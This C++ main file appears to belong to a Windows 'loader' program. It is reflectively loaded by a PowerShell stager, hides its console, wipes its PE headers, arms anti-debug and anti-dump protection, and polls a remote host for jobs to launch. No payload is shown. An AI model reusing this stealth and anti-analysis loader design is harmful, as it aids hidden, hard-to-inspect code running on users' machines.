// main.cpp — thin orchestrator. All real work lives in modules:
//   crypto/strings   → obfuscation
//   protect          → anti-debug / anti-inject / anti-dump
//   http/json        → transport + parsing
//   control          → local HTTP + cloud polling + job object
//   launcher         → product launch + heartbeat + browser bootstrap
#include "pch.h"
#include "protect.h"
#include "control.h"
#include "launcher.h"
#include "session.h"

// Runtime globals declared in config.h — defined here so the linker
// finds exactly one copy.
std::string g_api_host;
int         g_api_port  = cfg::DEFAULT_API_PORT;
bool        g_api_https = cfg::DEFAULT_API_HTTPS;
std::string g_loader_id;

// Pull YULLY_HOST env into g_api_*.
static void configure_from_env() {
    char buf[512];
    DWORD n = GetEnvironmentVariableA("YULLY_HOST", buf, sizeof(buf));
    std::string s = (n > 0 && n < sizeof(buf)) ? std::string(buf, n)
                                               : std::string(cfg::DEFAULT_API_HOST);
    if      (s.rfind("https://", 0) == 0) { g_api_https = true;  s = s.substr(8); g_api_port = 443; }
    else if (s.rfind("http://",  0) == 0) { g_api_https = false; s = s.substr(7); g_api_port = 80; }
    size_t slash = s.find('/');
    if (slash != std::string::npos) s = s.substr(0, slash);
    size_t colon = s.find(':');
    if (colon != std::string::npos) {
        g_api_port = atoi(s.c_str() + colon + 1);
        s = s.substr(0, colon);
    }
    g_api_host = s;
}

// Fresh per-run loader id (UUID → first 32 hex chars).
static void gen_loader_id() {
    UUID id; UuidCreate(&id);
    char* s = nullptr; UuidToStringA(&id, (RPC_CSTR*)&s);
    if (s) { g_loader_id = s; RpcStringFreeA((RPC_CSTR*)&s); }
    // Strip dashes.
    g_loader_id.erase(std::remove(g_loader_id.begin(), g_loader_id.end(), '-'),
                      g_loader_id.end());
}

// Redirect stdout/stderr to %TEMP%\yullyhub.log so we can debug when
// the PowerShell window is hidden and there's no visible console.
static void open_log() {
    char tempPath[MAX_PATH]; GetTempPathA(MAX_PATH, tempPath);
    std::string path = std::string(tempPath) + "yullyhub.log";
    FILE* f = freopen(path.c_str(), "a", stdout);
    if (f) setvbuf(f, NULL, _IONBF, 0);
    f = freopen(path.c_str(), "a", stderr);
    if (f) setvbuf(f, NULL, _IONBF, 0);
    std::cout << "\n=== " << GetTickCount64() << " loader boot ===" << std::endl;
}

int main(int argc, char** argv) {
    (void)argc; (void)argv;

    open_log();
    std::cout << "[main] log opened" << std::endl;

    // Nuke any prior session first — kills the previous PowerShell
    // host, its loader, and every product it spawned. Runs BEFORE we
    // hide our own console so if the kill somehow blocks the user
    // still sees what happened.
    session::kill_previous();
    session::register_self();
    std::cout << "[main] session claimed (host pid=" << GetCurrentProcessId() << ")" << std::endl;

    // Hide whatever console we're attached to. When reflectively loaded
    // by the PowerShell stager this is PowerShell's window itself.
    if (HWND con = GetConsoleWindow()) {
        ShowWindow(con, SW_HIDE);
        std::cout << "[main] console hidden" << std::endl;
    }

    protect::wipe_headers();
    protect::start_protection_thread();
    std::cout << "[main] protect armed" << std::endl;

    control::install_kill_switch();
    control::install_console_ctrl_handler();
    configure_from_env();
    gen_loader_id();
    std::cout << "[main] id=" << g_loader_id.substr(0, 8)
              << " host=" << g_api_host << ":" << g_api_port
              << (g_api_https ? " https" : " http") << std::endl;

    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        std::cerr << "[main] WSAStartup failed" << std::endl;
        return 1;
    }
    std::cout << "[main] winsock ready" << std::endl;

    control::start_local_server();
    std::cout << "[main] local server started on port " << control::local_port << std::endl;

    launcher::open_dashboard_browser_if_needed();
    std::cout << "[main] browser handoff done, entering poll loop" << std::endl;

    control::run_poll_loop();   // blocks

    WSACleanup();
    return 0;
}
